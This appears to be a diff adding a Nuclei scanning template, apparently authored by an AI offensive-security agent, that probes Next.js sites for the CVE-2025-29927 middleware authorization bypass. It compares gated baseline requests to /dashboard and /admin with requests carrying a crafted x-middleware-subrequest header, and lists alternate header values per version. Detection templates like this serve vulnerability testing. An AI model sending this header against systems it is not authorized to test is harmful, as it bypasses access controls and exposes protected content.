@@ -1,0 +1,50 @@
+id: moraa-nextjs-middleware-subrequest-bypass
+
+info:
+  name: Next.js x-middleware-subrequest Auth Bypass Probe (CVE-2025-29927)
+  author: moraa-ai-offsec-agent
+  severity: high
+  description: |
+    Controlled-difference probe for the Next.js middleware skip (CVE-2025-29927, NVD: versions
+    1.11.4+ prior to 12.3.5, 13.5.9, 14.2.25, 15.2.3 - authorization checks performed in
+    middleware can be bypassed with a crafted x-middleware-subrequest header).
+    Design: for two commonly middleware-gated paths (/dashboard, /admin) it fires a BASELINE
+    request without the header and a BYPASS request with it, then matches only when the
+    baseline was gated (3xx redirect or 401/403) while the header'd request returned 200. A
+    host where both read the same, or where the baseline was never gated, does NOT match -
+    that baseline-vs-header pairing is the control.
+    CONFIRM BY HAND: check the 200 body is actually the protected content, not a rewritten
+    login/home page. Alternate header values per version: "middleware", "pages/_middleware",
+    "src/middleware" (repeated form used here covers the newer patched-range versions).
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-29927
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 9.1
+    cve-id: CVE-2025-29927
+  metadata:
+    moraa-doc: nuclei-templates.md
+    moraa-gate: baseline gated + header'd 200 + protected content in body, or drop it
+  tags: bypass,nextjs,moraa,cve2025
+
+http:
+  - raw:
+      - |
+        GET /dashboard HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /dashboard HTTP/1.1
+        Host: {{Hostname}}
+        x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
+      - |
+        GET /admin HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /admin HTTP/1.1
+        Host: {{Hostname}}
+        x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "(status_code_2 == 200 && (status_code_1 == 301 || status_code_1 == 302 || status_code_1 == 307 || status_code_1 == 401 || status_code_1 == 403)) || (status_code_4 == 200 && (status_code_3 == 301 || status_code_3 == 302 || status_code_3 == 307 || status_code_3 == 401 || status_code_3 == 403))"
